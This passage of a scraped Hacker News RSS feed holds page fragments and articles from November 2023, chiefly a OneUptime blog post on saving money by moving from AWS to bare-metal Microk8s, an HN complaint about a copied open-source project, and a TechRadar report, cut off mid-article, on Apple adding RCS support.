                <h2 id="related-articles">Related Articles</h2>
                
    <ul>
        
            <li>
                <p>
                    <a href="https://www.nature.com/articles/d41586-022-01282-1" data-track="click" data-track-label="related article (rank:0)">
                        
                            <img loading="lazy" src="https://media.nature.com/lw100/magazine-assets/d41586-022-02161-5/d41586-022-02161-5_23349584.jpg" alt="">
                        
                        Young brain fluid improves memory in old mice
                    </a>
                </p>
            </li>
        
            <li>
                <p>
                    <a href="https://www.nature.com/articles/d41586-022-00971-1" data-track="click" data-track-label="related article (rank:1)">
                        
                            <img loading="lazy" src="https://media.nature.com/lw100/magazine-assets/d41586-022-02161-5/d41586-022-02161-5_20304320.jpg" alt="">
                        
                        Your brain expands and shrinks over time — these charts show how
                    </a>
                </p>
            </li>
        
            <li>
                <p>
                    <a href="https://www.nature.com/articles/d41586-022-00767-3" data-track="click" data-track-label="related article (rank:2)">
                        
                            <img loading="lazy" src="https://media.nature.com/lw100/magazine-assets/d41586-022-02161-5/d41586-022-02161-5_20285382.jpg" alt="">
                        
                        Can brain scans reveal behaviour? Bombshell study says not yet
                    </a>
                </p>
            </li>
        
            <li>
                <p>
                    <a href="https://www.nature.com/articles/d41586-022-00027-4" data-track="click" data-track-label="related article (rank:3)">
                        
                            <img loading="lazy" src="https://media.nature.com/lw100/magazine-assets/d41586-022-02161-5/d41586-022-02161-5_21969378.jpg" alt="">
                        
                        The COVID generation: how is the pandemic affecting kids’ brains?
                    </a>
                </p>
            </li>
        
            <li>
                <p>
                    <a href="https://www.nature.com/news/brain-s-chemical-signals-seen-in-real-time-1.20458" data-track="click" data-track-label="related article (rank:4)">
                        
                        Brain's chemical signals seen in real time
                    </a>
                </p>
            </li>
        
    </ul>

            

            
                <h2 id="subjects">Subjects</h2>
                
    <ul>
        
            <li>
                <a href="https://www.nature.com/subjects/psychology" data-track="click" data-track-label="subject (rank:0)">Psychology</a>
            </li>
        
            <li>
                <a href="https://www.nature.com/subjects/neuroscience" data-track="click" data-track-label="subject (rank:1)">Neuroscience</a>
            </li>
        
    </ul>

            <section data-component-latest-content="true" data-track="in-view" data-track-action="in-view" data-track-category="latest content" data-track-label="visible">
    <h2 id="tablist-heading">Latest on:</h2>
    <div id="latest-content">
        
            <div data-content="" id="latest-content-0" role="tablist" aria-labelledby="tablist-heading" data-container="">
                        
                            <article>
                                <a href="https://www.nature.com/articles/d41586-023-03458-9" data-track="click" data-track-label="latest magazine (tag:0) (rank:0)">
                                    
                                        <img src="https://images.nature.com/w140h79/magazine-assets/d41586-023-03458-9/d41586-023-03458-9_26255158.jpg" alt="Don’t overlook race and ethnicity: new guidelines urge change for psychology research" loading="lazy">
                                    
                                    <p>Don’t overlook race and ethnicity: new guidelines urge change for psychology research</p>
                                    <p><span>News</span> <span><time datetime="2023-11-03">03 NOV 23</time></span></p>
                                </a>
                            </article>
                        
                            <article>
                                <a href="https://www.nature.com/articles/s41586-023-06674-5" data-track="click" data-track-label="latest grover (tag:0) (rank:1)">
                                    
                                        <img src="https://media.nature.com/w140h79/springer-static/image/art%3A10.1038%2Fs41586-023-06674-5/MediaObjects/41586_2023_6674_Fig1_HTML.png" alt="Historical narratives about the COVID-19 pandemic are motivationally biased" loading="lazy">
                                    
                                    <p>Historical narratives about the COVID-19 pandemic are motivationally biased</p>
                                    <p><span>Article</span> <span><time datetime="2023-11-01">01 NOV 23</time></span></p>
                                </a>
                            </article>
                        
                            <article>
                                <a href="https://www.nature.com/articles/d41586-023-03340-8" data-track="click" data-track-label="latest magazine (tag:0) (rank:2)">
                                    
                                        <img src="https://images.nature.com/w140h79/magazine-assets/d41586-023-03340-8/d41586-023-03340-8_26244176.png" alt="From the archive: Halloween horrors" loading="lazy">
                                    
                                    <p>From the archive: Halloween horrors</p>
                                    <p><span>News &amp; Views</span> <span><time datetime="2023-10-31">31 OCT 23</time></span></p>
                                </a>
                            </article>
                        
                    </div>
        
            <div data-content="" id="latest-content-1" role="tablist" aria-labelledby="tablist-heading" data-container="">
                        
                            <article>
                                <a href="https://www.nature.com/articles/s41586-023-06737-7" data-track="click" data-track-label="latest grover (tag:1) (rank:0)">
                                    
                                        <img src="https://media.nature.com/w140h79/springer-static/image/art%3A10.1038%2Fs41586-023-06737-7/MediaObjects/41586_2023_6737_Fig1_HTML.png" alt="Potentiating glymphatic drainage minimizes post-traumatic cerebral oedema" loading="lazy">
                                    
                                    <p>Potentiating glymphatic drainage minimizes post-traumatic cerebral oedema</p>
                                    <p><span>Article</span> <span><time datetime="2023-11-15">15 NOV 23</time></span></p>
                                </a>
                            </article>
                        
                            <article>
                                <a href="https://www.nature.com/articles/d41586-023-03482-9" data-track="click" data-track-label="latest magazine (tag:1) (rank:1)">
                                    
                                        <img src="https://images.nature.com/w140h79/magazine-assets/d41586-023-03482-9/d41586-023-03482-9_26273872.jpg" alt="AI that reads brain scans shows promise for finding Alzheimer’s genes" loading="lazy">
                                    
                                    <p>AI that reads brain scans shows promise for finding Alzheimer’s genes</p>
                                    <p><span>News</span> <span><time datetime="2023-11-10">10 NOV 23</time></span></p>
                                </a>
                            </article>
                        
                            <article>
                                <a href="https://www.nature.com/articles/d41586-023-03400-z" data-track="click" data-track-label="latest magazine (tag:1) (rank:2)">
                                    
                                        <img src="https://images.nature.com/w140h79/magazine-assets/d41586-023-03400-z/d41586-023-03400-z_26269086.jpg" alt="One brain area helps you to enjoy a joke — but another helps you to get it" loading="lazy">
                                    
                                    <p>One brain area helps you to enjoy a joke — but another helps you to get it</p>
                                    <p><span>Research Highlight</span> <span><time datetime="2023-11-09">09 NOV 23</time></span></p>
                                </a>
                            </article>
                        
                    </div>
        
    </div>
</section>




            <div>
                
    
        <div>
            <h2>
                <img src="https://www.nature.com/static/images/logos/nature-careers-logo-f6ff1c1c64.svg" width="195" height="23" alt="Nature Careers">
            </h2>
        </div>
        <h3>
            <a href="https://www.nature.com/naturecareers/" data-track="click" data-track-action="section-link" data-track-label="jobs list title">Jobs
                
            </a>
        </h3>
        <ul>
            
                <li>
                    <div>
                        <h4><a href="https://www.nature.com/naturecareers/job/12810390/postdoctoral-associate/?TrackID=62&amp;utm_source=widget&amp;utm_medium=referral&amp;utm_campaign=62" data-track="click" data-track-action="Rank:(0)" data-track-category="job-list" data-track-label="12810390">Postdoctoral Associate</a></h4>
                        
                        <div>
                            
                            <p>Houston, Texas (US)</p>
                            <p>Baylor College of Medicine (BCM)</p>
                        </div>
                    </div>
                    
                        <p><img src="https://www.nature.com/naturecareers/getasset/eb5c581a-539f-439b-a848-eb32e266d6f5/" alt="" loading="lazy">
                        </p>
                    
                </li>
            
                <li>
                    <div>
                        <h4><a href="https://www.nature.com/naturecareers/job/12810389/postdoctoral-associate/?TrackID=62&amp;utm_source=widget&amp;utm_medium=referral&amp;utm_campaign=62" data-track="click" data-track-action="Rank:(1)" data-track-category="job-list" data-track-label="12810389">Postdoctoral Associate</a></h4>
                        
                        <div>
                            
                            <p>Houston, Texas (US)</p>
                            <p>Baylor College of Medicine (BCM)</p>
                        </div>
                    </div>
                    
                        <p><img src="https://www.nature.com/naturecareers/getasset/eb5c581a-539f-439b-a848-eb32e266d6f5/" alt="" loading="lazy">
                        </p>
                    
                </li>
            
                <li>
                    <div>
                        <h4><a href="https://www.nature.com/naturecareers/job/12810385/-senior-research-scientist-statistical-genetics/?TrackID=62&amp;utm_source=widget&amp;utm_medium=referral&amp;utm_campaign=62" data-track="click" data-track-action="Rank:(2)" data-track-category="job-list" data-track-label="12810385">(Senior) Research Scientist - Statistical Genetics</a></h4>
                        
                        <div>
                            <p>What You will Be Doing: As a (Senior) Research Scientist of Statistical Genetics, you will be responsible for analyzing large-scale human genetic d...</p>
                            <p>Toronto (City), Ontario (CA)</p>
                            <p>Deep Genomics Inc.</p>
                        </div>
                    </div>
                    
                        <p><img src="https://www.nature.com/naturecareers/getasset/91812a2b-7ad1-48da-9219-9533d91e4466/" alt="" loading="lazy">
                        </p>
                    
                </li>
            
                <li>
                    <div>
                        <h4><a href="https://www.nature.com/naturecareers/job/12810381/cbm-postdoctoral-call-offering-8-postdoc-positions-to-outstanding-candidates/?TrackID=62&amp;utm_source=widget&amp;utm_medium=referral&amp;utm_campaign=62" data-track="click" data-track-action="Rank:(3)" data-track-category="job-list" data-track-label="12810381">CBM Postdoctoral Call - offering 8 postdoc positions to outstanding candidates</a></h4>
                        
                        <div>
                            <p>8 postdoctoral positions, with a duration of 3 years, to work on highly interdisciplinary topics related to any of our research areas in biomedicine</p>
                            <p>28049, Madrid (ES)</p>
                            <p>Centro de Biología Molecular Severo Ochoa</p>
                        </div>
                    </div>
                    
                        <p><img src="https://www.nature.com/naturecareers/getasset/2eadd168-97f7-4148-9ed0-e24b310dd10a/" alt="" loading="lazy">
                        </p>
                    
                </li>
            
                <li>
                    <div>
                        <h4><a href="https://www.nature.com/naturecareers/job/12810348/assistant-associate-full-professor-positions-in-spoe-at-guangdong-university-of-technology/?TrackID=62&amp;utm_source=widget&amp;utm_medium=referral&amp;utm_campaign=62" data-track="click" data-track-action="Rank:(4)" data-track-category="job-list" data-track-label="12810348">Assistant/Associate/Full Professor Positions in SPOE at Guangdong University of Technology</a></h4>
                        
                        <div>
                            <p>School Profile The School of Physics and Optoelectronic Engineering (SPOE) at Guangdong University of Technology&nbsp;is a leading research institute in...</p>
                            <p>Guangzhou, Guangdong (CN)</p>
                            <p>Guangdong University of Technology-SPOE</p>
                        </div>
                    </div>
                    
                        <p><img src="https://www.nature.com/naturecareers/getasset/2abca669-736e-418b-ba6b-c3ecceae7091/" alt="" loading="lazy">
                        </p>
                    
                </li>
            
        </ul>
    

            </div>

        
            
                    </article>
                </main>
            
        

        
        <p><img src="https://www.nature.com/x9308xry/article/d41586-022-02161-5" width="1" height="1" alt="">
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Moving from AWS to Bare-Metal saved us $230k per year (256 pts)]]></title>
            <link>https://blog.oneuptime.com/moving-from-aws-to-bare-metal/</link>
            <guid>38294569</guid>
            <pubDate>Thu, 16 Nov 2023 19:54:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.oneuptime.com/moving-from-aws-to-bare-metal/">https://blog.oneuptime.com/moving-from-aws-to-bare-metal/</a>, See on <a href="https://news.ycombinator.com/item?id=38294569">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>In the ever-evolving world of technology, businesses are constantly looking for ways to optimize their operations and reduce costs. One such journey we embarked on was moving our infrastructure from Amazon Web Services (AWS) to a bare-metal solution. This transition not only provided us with more control over our resources but also resulted in substantial financial savings.</p><p>While the cost savings and technological benefits were significant factors in our decision to move from AWS to a bare-metal solution, there was another crucial reason behind this transition.</p><p><strong>Most of our customers are on the public cloud, and part of our service involves notifying them when the public cloud goes down.</strong> <strong>To ensure we can provide this service reliably and independently of the public cloud’s status, we needed to be on our own dedicated data center.</strong></p><p>By moving to a bare-metal solution in a colocation facility, we’ve been able to achieve this independence. This move has not only resulted in substantial cost savings but also enhanced our service reliability and customer communication, further demonstrating the multifaceted benefits of considering alternative infrastructure solutions.</p><h2 id="our-initial-setup-kubernetes-on-aws">Our Initial Setup: Kubernetes on AWS</h2><p>In the early stages of our technological journey, we adopted a Kubernetes cluster on Amazon Web Services (AWS), utilizing their managed Elastic Kubernetes Service (EKS) offering. </p><p>OneUptime, our open-source observability platform is built on a robust foundation of open-source software such as Redis, Postgres, Clickhouse, Docker, NodeJS, and BullMQ. Interestingly, none of these technologies are AWS-specific. This choice was intentional and strategic.</p><p><strong>Our goal was to avoid reliance on AWS or any proprietary cloud technology. </strong>The reason? We wanted to empower our customers with the ability to self-host OneUptime on their own clusters. This approach not only aligns with our commitment to open-source but also provides our customers with greater control and flexibility. For those interested in self-hosting OneUptime, the Helm chart is readily available on <a href="https://artifacthub.io/packages/helm/oneuptime/oneuptime?ref=blog.oneuptime.com" rel="noreferrer">Artifact Hub</a> here.</p><p>While AWS offered us flexibility and scalability, we began to realize that these benefits could be achieved elsewhere and at a fraction of the cost. This realization sparked a shift in our approach and led us to explore more cost-effective yet equally efficient alternatives.</p><p>In our continuous pursuit of technological excellence, we recently made the strategic decision to transition to a bare-metal solution. Our choice was to run a Microk8s cluster in a colocation facility, a decision driven by our past experiences and future aspirations.</p><p>Historically, we’ve always maintained an internal self-hosted test cluster on Microk8s. This hands-on experience with a Kubernetes flavor not only enriched our understanding but also bolstered our confidence in setting up a production-ready cluster.</p><p><strong>There’s a common misconception that Microk8s is solely for edge computing or development purposes. However, this couldn’t be further from the truth. In fact, numerous companies, including ours, are now leveraging Microk8s in production environments.</strong> This shift is testament to the robustness and versatility of Microk8s, proving it to be a viable option for diverse use-cases.</p><p>Transitioning to bare-metal servers has provided us with dedicated resources, effectively eliminating the ‘noisy neighbor’ issue often experienced in shared hosting environments like AWS.&nbsp;This issue arises when multiple customers share the same server resources, leading to performance degradation if one customer hogs more than their fair share of resources.</p><p>Now, we have complete control over our hardware. This autonomy allows us to fine-tune our servers to meet our specific needs, optimizing performance and efficiency. We can customize every aspect of our infrastructure, from the operating system and network architecture to the type and amount of storage used.</p><h2 id="the-role-of-kubernetes-and-helm-in-our-transition">The Role of Kubernetes and Helm in Our Transition</h2><p>Technologies like <strong>Kubernetes</strong> and <strong>Helm</strong> have played a significant role in our transition from the cloud to our own servers. Kubernetes, an open-source platform designed to automate deploying, scaling, and operating application containers, has made it easier for us to manage our applications on our own servers.</p><p>Helm, on the other hand, is a package manager for Kubernetes that simplifies the process of defining, installing, and upgrading complex Kubernetes applications. It’s like a homebrew for Kubernetes; it packages up applications into charts (collections of files that describe a related set of Kubernetes resources) that can be deployed onto your cluster.</p><p>These technologies have made it incredibly easy to ‘de-cloud’ and move to our own servers. They’ve provided us with the flexibility and control we needed while ensuring that the transition was smooth and efficient. </p><h2 id="storage-and-loadbalancers">Storage and LoadBalancers </h2><p>Most people are confused on how are volumes provisioned and how are load balancers provisioned on a bare metal kubernets cluster, </p><p>We use&nbsp;<strong>Network File System (NFS)</strong>&nbsp;for volumes. NFS is a distributed file system protocol that allows a user on a client computer to access files over a network in a manner similar to how local storage is accessed. Microk8s makes it incredibly easy to implement NFS storage, which has been a significant advantage for us. You can check their docs here on how to configure one: <a href="https://microk8s.io/docs/nfs?ref=blog.oneuptime.com">https://microk8s.io/docs/nfs</a></p><p>For managing publicly facing services, we use&nbsp;<strong>MetalLB</strong>. MetalLB is a load-balancer implementation for bare metal Kubernetes clusters, using standard routing protocols. Microk8s offers a plugin that simplifies the process of integrating MetalLB into our setup. You can check the docs here: <a href="https://microk8s.io/docs/addon-metallb?ref=blog.oneuptime.com">https://microk8s.io/docs/addon-metallb</a> </p><p>We will do a blog post soon to explain how to configure these if you're thinking about de-clouding yourself. </p><h2 id="the-financial-impact-saving-230000-per-year">The Financial Impact: Saving $230,000+ per Year</h2><h2 id="before-migration">Before Migration</h2><p>When we were utilizing AWS, our setup consisted of a 28-node managed Kubernetes cluster. Each of these nodes was an m7a EC2 instance. With block storage and network fees included, our monthly bills amounted to $38,000+. This brought our annual expenditure to over $456,000+.</p><h2 id="after-migration">After Migration</h2><p>We transitioned to using a single rack configuration at our co-location partner, providing us with 40 rack units of usable space. With each server being 2U - we could potentially rack about 18 of them (other U's are usually for networking equipment). Each of our servers are upgradeable to over 1 TB of RAM and has 2 socket 128 core CPU with about 80 TB usable of storage in our storage cluster. </p><p>The financial implications of this move were significant. We allocated and invested $150,000 in new servers for our bare-metal setup. While this might appear as a substantial upfront cost, the long-term savings have been nothing short of remarkable.</p><p>Our monthly operational expenditure (op-ex), which includes power, cooling, energy, and remote hands (although we seldom use this service), is now approximately $5,500. When compared to our previous AWS costs, we’re saving over $230,000 roughly per year if you amortize the cap-ex costs of the server over 5 years. This substantial reduction in expenses has enabled us to allocate resources to other critical areas of our business and has facilitated the hiring of more engineers. <strong>Thats over 55% in savings for better compute! </strong></p><h2 id="things-to-consider">Things to Consider</h2><p><strong>Backups:</strong> We back up all of our data multiple times a day to a storage server located at two of our offices - one in Boston, US, and the other in London, UK. You can also do this to a public cloud. We think its easier and cheaper to do it on-prem.</p><p><strong>Multi Location Cluster: </strong> You could also run a multi-location kubernetes cluster on two different co-location facility with 2 different co-location partners in 2 different continents for higher redundancy. You could potentally do this by creating a VPN between these two locations. </p><p><strong>Backup Cluster: </strong>We have a ready to go backup cluster on AWS that can spin up in under 10 minutes if something were to happen to our co-location facility. Helm charts + k8s make it really easy to spin these up. We still use AWS in disaster scenarios and haven't closed our AWS account just yet! </p><p><strong>Server Admins</strong>: When planning a transition to bare metal, many believe that hiring server administrators is a necessity. While their role is undeniably important, it’s worth noting that a substantial part of hardware maintenance is actually managed by the colocation facility. In the context of AWS, the expenses associated with employing AWS administrators often exceed those of Linux on-premises server administrators. This represents an additional cost-saving benefit when shifting to bare metal. With today’s servers being both efficient and reliable, the need for “management” has significantly decreased. </p><p><strong>Use of Microk8s</strong>: There is a common misconception that Microk8s is only for edge computing or development purposes. However, this is not true at all. Microk8s is a small, fast, and single-package Kubernetes distribution that can run on any platform. Many companies, including ours, are using Microk8s in production environments and the official documentation supports this use case. We have been very satisfied with Microk8s so far, but we are also flexible to change to another Kubernetes distribution if needed. The beauty of Kubernetes is that it is portable, extensible, and open source, so switching flavors is easy. We chose Kubernetes because it is the best platform for managing containerized workloads and services.</p><h2 id="conclusion">Conclusion</h2><p>Our transition from AWS to bare-metal infrastructure underscores the fact that while cloud services such as AWS offer robust flexibility and power, they may not always be the most economical choice for every enterprise. By harnessing the power of open-source technologies and investing in our own hardware, we’ve not only gained greater control over our resources but also realized substantial savings in operational costs.</p><p>It’s important to remember that each business has its own unique needs. What proved successful for us may not necessarily yield the same results for everyone. Therefore, conducting a comprehensive evaluation of your specific requirements is crucial before undertaking such a transition.</p><p>Thanks to advancements in technologies like Docker, Kubernetes, Helm, Microk8s, and more, transitioning to bare-metal infrastructure is now significantly easier than it was just a few years ago.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Hackers know everything is securities fraud (153 pts)]]></title>
            <link>https://www.bloomberg.com/opinion/articles/2023-11-16/hackers-know-everything-is-securities-fraud</link>
            <guid>38293817</guid>
            <pubDate>Thu, 16 Nov 2023 19:01:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bloomberg.com/opinion/articles/2023-11-16/hackers-know-everything-is-securities-fraud">https://www.bloomberg.com/opinion/articles/2023-11-16/hackers-know-everything-is-securities-fraud</a>, See on <a href="https://news.ycombinator.com/item?id=38293817">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
    <section>
        <h3>Why did this happen?</h3>
        <p>Please make sure your browser supports JavaScript and cookies and that you are not
            blocking them from loading.
            For more information you can review our <a href="https://www.bloomberg.com/notices/tos">Terms of
                Service</a> and <a href="https://www.bloomberg.com/notices/tos">Cookie Policy</a>.</p>
    </section>
    <section>
        <h3>Need Help?</h3>
        <p>For inquiries related to this message please <a href="https://www.bloomberg.com/feedback">contact
            our support team</a> and provide the reference ID below.</p>
        <p>Block reference ID:</p>
    </section>
</section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Air Accident Investigation Branch: film lights caused window damage on A321neo (229 pts)]]></title>
            <link>https://www.flightradar24.com/blog/aaib-says-film-lights-caused-window-damage-on-titan-a321neo/</link>
            <guid>38293714</guid>
            <pubDate>Thu, 16 Nov 2023 18:54:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.flightradar24.com/blog/aaib-says-film-lights-caused-window-damage-on-titan-a321neo/">https://www.flightradar24.com/blog/aaib-says-film-lights-caused-window-damage-on-titan-a321neo/</a>, See on <a href="https://news.ycombinator.com/item?id=38293714">Hacker News</a></p>
Couldn't get https://www.flightradar24.com/blog/aaib-says-film-lights-caused-window-damage-on-titan-a321neo/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: My open source project got stolen by a HN user (102 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=38293698</link>
            <guid>38293698</guid>
            <pubDate>Thu, 16 Nov 2023 18:52:53 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=38293698">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><td><table>
        <tbody><tr id="38293698">
      <td><span></span></td>      <td><center><a id="up_38293698" href="https://news.ycombinator.com/vote?id=38293698&amp;how=up&amp;goto=item%3Fid%3D38293698"></a></center></td><td><span><a href="https://news.ycombinator.com/item?id=38293698">My open source project got stolen by a HN user</a></span></td></tr><tr><td colspan="2"></td><td><span>
          <span id="score_38293698">102 points</span> by <a href="https://news.ycombinator.com/user?id=AndreVitorio">AndreVitorio</a> <span title="2023-11-16T18:52:53"><a href="https://news.ycombinator.com/item?id=38293698">16 hours ago</a></span> <span id="unv_38293698"></span> | <a href="https://news.ycombinator.com/hide?id=38293698&amp;goto=item%3Fid%3D38293698">hide</a> | <a href="https://hn.algolia.com/?query=My%20open%20source%20project%20got%20stolen%20by%20a%20HN%20user&amp;type=story&amp;dateRange=all&amp;sort=byDate&amp;storyText=false&amp;prefix&amp;page=0">past</a> | <a href="https://news.ycombinator.com/fave?id=38293698&amp;auth=4e251ecb78c113f85e9a18a2b14ecab717eeb7e4">favorite</a> | <a href="https://news.ycombinator.com/item?id=38293698">36&nbsp;comments</a>        </span>
              </td></tr>
    <tr></tr><tr><td colspan="2"></td><td><div><p>Hey everyone, I've got a bit of a situation and could use some insight.</p><p>So, I created this open-source project called Outstatic (https://outstatic.com), it's been my pet project for a while. But here's the twist: I just found out someone on HN (https://news.ycombinator.com/user?id=hoofhearted) took my entire project, renamed it, and has been showing it off all over the internet as their own thing.</p><p>I'm not usually one to call people out, but this is just too much. The only reason I found out was because this person was asking for help with my project on our Discord server, and I got curious.</p><p>Turns out, they've been pretending to develop this 'new' project since April and have even been warned by the mods here for spamming about it. When I casually mentioned that I stumbled upon their project and that it looked cool, they went on and on about their 'original vision' and even had the nerve to ask me to join them as a co-founder!</p><p>I understand that open source means people can use and modify the work, but claiming total credit and denying any connection to the original project? That's a bit much. I did bring up the issue of giving credit and licensing, and the response was a vague promise of 'eventually' doing it.</p><p>Just wanted to get this off my chest and see what you all think. It's a weird spot to be in, for sure.</p><p>He's fooled a bunch of people into joining and contributing to “his project”. So I feel like I should at least warn them that they are making contributions to a "stolen” project.</p><p>Here's a list of posts where this person claims they built everything and intentionally mention all the tech stack but leaves “Outstatic” out of it: https://dub.sh/code-theft</p></div></td></tr>        <tr></tr><tr><td colspan="2"></td><td><form action="comment" method="post"></form></td></tr>  </tbody></table>
  </td></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Apple to support RCS messaging standard next year (168 pts)]]></title>
            <link>https://www.techradar.com/phones/iphone/breaking-apple-will-support-rcs-in-2024</link>
            <guid>38293348</guid>
            <pubDate>Thu, 16 Nov 2023 18:23:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.techradar.com/phones/iphone/breaking-apple-will-support-rcs-in-2024">https://www.techradar.com/phones/iphone/breaking-apple-will-support-rcs-in-2024</a>, See on <a href="https://news.ycombinator.com/item?id=38293348">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-widget-type="contentparsed" id="content">

<section>
<div itemprop="image" itemscope="" itemtype="https://schema.org/ImageObject">
<div>
<picture><source type="image/webp" alt="iPhone 15 Pro Max" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" srcset="https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-1200-80.jpg.webp 1200w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-1920-80.jpg.webp 1920w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897.jpg"><source type="image/jpeg" alt="iPhone 15 Pro Max" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" srcset="https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-1920-80.jpg 1920w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897.jpg"><img src="https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-320-80.jpg" alt="iPhone 15 Pro Max" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" srcset="https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897-1920-80.jpg 1920w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897.jpg"></picture>
</div>
<meta itemprop="url" content="https://cdn.mos.cms.futurecdn.net/saZUc78xDTkbaJGT8xb897.jpg">
<meta itemprop="height" content="600">
<meta itemprop="width" content="338">
<figcaption itemprop="caption description">
<span itemprop="copyrightHolder">(Image credit: Future / Lance Ulanoff)</span>
</figcaption>
</div>

<div id="article-body">
<p><a data-analytics-id="inline-link" href="https://www.techradar.com/tag/apple" data-auto-tag-linker="true" data-before-rewrite-localise="https://www.techradar.com/tag/apple">Apple</a> will finally add RCS messaging standard support to the iPhone through a software release early next year, the company told TechRadar.</p><p>RCS or Rich Communication Services, a communications standard developed by the GSM Association and adopted by much of the Android ecosystem, is designed to universally elevate messaging communication across mobile devices. Even though Apple has been working with the group, it has until this moment steadfastly refused to add RCS support to iPhones. Now, however, Apple is changing its tune.</p><p>"Later next year, we will be adding support for RCS Universal Profile, the standard as currently published by the GSM Association. We believe the RCS Universal Profile will offer a better interoperability experience when compared to SMS or MMS. This will work alongside iMessage, which will continue to be the best and most secure messaging experience for Apple users," said an Apple spokesperson.</p><p>Apple now acknowledges that RCS is an improvement over MMS and SMS but made it clear that RCS is not replacing iMessage and its host of features like memojies, stickers, and the ability to edit and unsend messages. Instead, the RCS standard support will arrive in an unspecified software update and then it will be up to carriers to add it.</p><p>When RCS does arrive on your <a data-analytics-id="inline-link" href="https://www.techradar.com/news/best-iphone" data-before-rewrite-localise="https://www.techradar.com/news/best-iphone">best iPhone</a>, though, it means the end of the "green bubble shame" for your <a data-analytics-id="inline-link" href="https://www.techradar.com/best/best-android-phones" data-before-rewrite-localise="https://www.techradar.com/best/best-android-phones">best Android phone</a>-owning friends, family, and coworkers. They'll be able to send and receive high-resolution photos and videos from their phones to your iPhone. Group messaging could become platform agnostic. And they'll be able to share their location with you through RCS-supported messaging.</p><p>There is, naturally, a wrinkle here. The RCS standard still doesn't support end-to-end encryption. Apple, which has offered encrypted messaging for over a decade, is kind of a stickler about security. Apple says it won't be supporting any proprietary extensions that seek to add encryption on top of RCS and hopes, instead, to work with the GSM Association to add encryption to the standard.</p><p>As long as third-party apps support the universal RCS standard, though, they will work with Apple's incoming RCS support.</p><p>Apple offered no details on which iOS update might include RCS support. And it's unclear just how many generations of iPhone will support the communication standard.</p><h2 id="a-messaging-breakthrough-3">A messaging breakthrough</h2><p>The news comes long after Apple's biggest competitors and Android leaders, <a data-analytics-id="inline-link" href="https://www.techradar.com/tag/samsung" data-auto-tag-linker="true" data-before-rewrite-localise="https://www.techradar.com/tag/samsung">Samsung</a> and <a data-analytics-id="inline-link" href="https://www.techradar.com/tag/google" data-auto-tag-linker="true" data-before-rewrite-localise="https://www.techradar.com/tag/google">Google</a>, introduced support for the standard. <a data-analytics-id="inline-link" href="https://economictimes.indiatimes.com/tech/technology/google-mocks-apple-in-new-video-for-lack-of-rcs-messaging-support/articleshow/103889306.cms" 